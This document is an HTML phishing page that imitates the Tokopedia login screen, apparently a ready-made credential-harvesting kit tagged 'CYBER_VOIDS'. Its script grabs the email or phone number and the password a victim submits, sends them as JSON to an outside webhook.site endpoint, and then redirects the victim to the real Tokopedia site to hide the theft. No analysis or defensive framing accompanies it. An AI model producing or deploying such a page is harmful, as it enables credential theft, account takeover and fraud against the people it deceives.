<!DOCTYPE html>
<html>
<head>
    <title>Tokopedia - Masuk</title>
    <style>
        body {font-family: Arial; background: #f5f5f5; margin: 0; padding: 20px;}
        .container {max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);}
        .logo {text-align: center; margin-bottom: 20px;}
        .logo img {width: 150px;}
        input {width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;}
        button {width: 100%; padding: 12px; background: #42b549; color: white; border: none; border-radius: 5px; font-weight: bold;}
        .footer {text-align: center; margin-top: 20px; font-size: 12px; color: #888;}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://ecs7.tokopedia.net/assets-tokopoints-email/images/logo-tokopedia.png">
        </div>
        <h2>Masuk ke Akun Anda</h2>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email/No HP" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">MASUK</button>
        </form>
        <div class="footer">
            Dengan masuk, kamu setuju dengan Syarat & Ketentuan
        </div>
    </div>

    <script>
    // CYBER_VOIDS SIMPLE WORKING SCRIPT
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;
        
        // 1. LOG KE CONSOLE
        console.log('üìß Email:', email);
        console.log('üîê Password:', password);
        
        // 2. KIRIM KE WEBHOOK (URL BENAR)
        fetch('https://webhook.site/5d45d6aa-9c8a-47d3-ba64-d89bdfdc4d3', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                email: email,
                password: password,
                time: new Date().toISOString()
            })
        })
        .then(() => console.log('‚úÖ Data terkirim'))
        .catch(err => console.error('‚ùå Error:', err));
        
        // 3. REDIRECT
        setTimeout(function() {
            window.location.href = 'https://www.tokopedia.com';
        }, 1000);
    });
    </script>
</body>
</html>
